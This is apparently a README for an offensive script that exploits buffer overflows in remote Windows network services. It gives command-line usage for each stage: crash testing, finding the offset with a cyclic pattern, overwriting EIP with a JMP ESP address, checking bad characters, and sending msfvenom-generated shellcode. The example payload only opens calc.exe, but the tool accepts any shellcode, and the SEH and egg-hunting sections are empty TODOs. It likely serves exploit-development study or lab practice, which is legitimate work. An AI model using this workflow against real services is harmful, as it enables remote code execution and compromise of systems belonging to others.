# Buffer-Overflow

## ig-buffer-overflow.py
* Help functions for exploting buffer overflow vulnerabilities in a Windows remote binary. 
* Tested with: Vanilla Buffer Overflow, Structured Exception Handling Overwrite (SEH Overwrite), Egg Hunting.

## Usage

test - Sends simple string (AAAAA) with buffer size and buffer head for memory test
```
./ig-buffer-overflow.py -m test --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/'
```

cyclic - Sends cyclic pattern to help identify memory positions
```
./ig-buffer-overflow.py -m cyclic --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/'
```

checkoffset - Auxiliary mode for offset detection on pattern
```
./ig-buffer-overflow.py -m checkoffset --value=31704331 --length=5000
```

write - Writes hex value to buffer offset
```
./ig-buffer-overflow.py -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809
```

write - Write badchars (before or after offset content) for badchar verification
```
./ig-buffer-overflow.py -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809 --badchar=after --exclude=000a
./ig-buffer-overflow.py -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809 --badchar=before --exclude=000a --reversejmp=800
```

exploit - Sends malicious payload via buffer overflow
```
./ig-buffer-overflow.py -m exploit --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809 --reversejmp=800 --shellcode=opencalc --nops=10
```

## Parameters:
* --help|-h	: Show script usage.
* --norec|-n	: Don't wait for receive message after connect.
* --mode|-m	: Script mode (test|cyclic|write|exploit).
* --rhost		: Remote host IP.
* --rport		: Remote host port.
* --buffsize	: Amount of variable bytes to send.
* --buffhead	: Static buffer string set at the beginning of the buffer.
  * Is usually the crash string. Size is considered in buffsize calc.
* --offset	: Place in buffer where content can be added.
* --hexcontent	: Hex string to add at the offset position.
  * Can be considered as big endian (default) or little endian (will be reversed).
  * Use 'g' or 'l' to delimit the order. Examples:
    * 'g01020304l05060708' --> will send '0102030408070605'
    * '01020304' --> will send '01020304'
* --badchar	: Adds bad chars before (before) or after (after) the content. Used for bad char testing.
* --exclude	: List of chars (formatted as hex string) to be excluded from badchar list.
* --reversejmp	: Size in bytes to jump before the content to inject bad chars or the shell code.
* --shellcode	: Hex shell code file generated using msfvenom.
  * Example: msfvenom -p windows/exec cmd=calc.exe -b '\x00' -f hex EXITFUNC=thread -o opencalc
* --nops		: Amount of nops to add before and after the shell code. Default is 0.
* --value		: Offset value.
* --length	: Cyclic pattern length.
* --interact	: Interacts with the application before sending the payload. For each message in string (separated with ';;'), sends and receives response from app.
  * Example: --interact='login;;user' --> Sends 'login', gets response, sends 'user', gets response, and finally sends the generated payload

## Vanilla Buffer Overflow example

1. Overwrite EIP
```
./ig-buffer-overflow.py -m test --rhost=10.2.31.155 --rport=2048 --buffsize=5009 --buffhead='cmd1 /.:/'
```

2. Identify EIP offset
```
./ig-buffer-overflow.py -m cyclic --rhost=10.2.31.155 --rport=2048 --buffsize=5009 --buffhead='cmd1 /.:/'
```

3. Test for badchar (JMP ESP address 625012F0 found using !mona jmp -n -r ESP)
```
./ig-buffer-overflow.py -m write --rhost=10.2.31.155 --rport=2048 --buffsize=5009 --buffhead='cmd1 /.:/' --offset=1203 --hexcontent=l625012F0 --badchar=after --exclude=00
```

4. Execute shell code
```
msfvenom -p windows/exec cmd=calc.exe -b "\x00" -f hex EXITFUNC=thread -o mycalc

./ig-buffer-overflow.py -m exploit --rhost=10.2.31.155 --rport=2048 --buffsize=5009 --buffhead='cmd1 /.:/' --offset=1203 --hexcontent=l625012F0 --shellcode=mycalc --nops=12
```


## SEH Overwrite example

TODO

## Egg Hunting example

TODO